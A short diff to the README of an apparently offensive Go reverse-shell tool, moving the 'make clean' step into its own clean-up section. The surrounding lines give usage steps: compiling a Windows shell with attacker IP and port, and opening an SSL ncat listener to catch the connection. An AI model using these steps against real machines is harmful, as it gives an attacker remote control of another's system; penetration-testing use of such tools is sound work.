@@ -31,8 +31,6 @@ git clone https://github.com/Alpharivs/go-shell.git
 make prepare
 # Compile Shell 
 make windows64/windows32 LHOST=[IP] LPORT=[PORT]
-# Delete Certificates and shell
-make clean
 ```
 - Set up a listener with ncat or any tool that can handle incoming ssl connections
 ```bash
@@ -41,6 +39,11 @@ ncat --ssl --ssl-cert server.pem --ssl-key server.key -lnvp [PORT]
 ```
 - execute !
 
+- clean up
+```bash
+# Delete Certificates and shell
+make clean
+```
 if you want a more in depth explanation of how it works check out [hershell](https://github.com/lesnuages/hershell).
 
 <h2 align="center" > LVX-SIT</h2>
